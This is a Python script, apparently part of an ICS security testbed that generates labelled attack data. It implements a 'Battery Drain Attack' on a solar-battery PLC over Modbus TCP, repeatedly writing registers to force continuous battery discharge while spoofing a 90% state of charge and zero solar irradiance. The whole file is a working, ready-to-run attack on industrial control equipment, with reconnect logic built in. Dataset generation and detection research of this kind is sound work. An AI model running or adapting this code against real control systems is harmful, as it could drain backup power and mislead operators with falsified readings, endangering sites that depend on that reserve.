"""
Attack #9: Battery_Drain_Attack (Battery Drain Attack)
======================================================
Target: HR3 (Battery Mode) + HR20 (SoC) + HR22 (Irradiance)
Technique: Forces the battery into continuous discharge, reports an
           inflated SoC, and reports zero solar output to force unnecessary
           discharge.
Effect: The battery is fully drained, leaving no reserve for a real outage.
MITRE ATT&CK for ICS: T0831 - Manipulation of Control
"""
import time, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pymodbus.client import ModbusTcpClient
from attacks.config import (PLC_IP, PLC_PORT, UNIT_ID,
    HR3_BATTERY, HR20_SOC, HR22_IRRADIANCE, HR2_SOLAR_LIMIT,
    LABEL_BATTERY_DRAIN)

ATTACK_NAME = "Battery_Drain_Attack"
ATTACK_ID   = LABEL_BATTERY_DRAIN

FORCE_DISCHARGE = 1   # HR3=1 -> continuous discharge
FAKE_SOC        = 90  # Report SoC=90% (actually dropping)
FAKE_IRRAD      = 0   # Report no solar -> force PLC to rely on the battery
SOLAR_ZERO      = 0   # Solar limit 0%

def run_attack(duration_sec=600, label_manager=None):
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  Battery=DISCHARGE, SoC=90%(fake), Solar=0%")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME,
            f"HR3={FORCE_DISCHARGE}, HR20={FAKE_SOC}, HR22={FAKE_IRRAD}")

    start_time = time.time()
    pkt_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR3_BATTERY, value=FORCE_DISCHARGE)
                client.write_register(address=HR20_SOC, value=FAKE_SOC)
                client.write_register(address=HR22_IRRADIANCE, value=FAKE_IRRAD)
                client.write_register(address=HR2_SOLAR_LIMIT, value=SOLAR_ZERO)
                pkt_count += 4
            except Exception:
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if pkt_count % 400 == 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [DRAIN] {pkt_count} packets | battery draining | remaining: {rem:.0f}s")
            time.sleep(0.5)

    except KeyboardInterrupt:
        print("\n  [DRAIN] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} packets, {elapsed:.1f}s")
        print(f"\n  [DRAIN] {pkt_count} packets, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
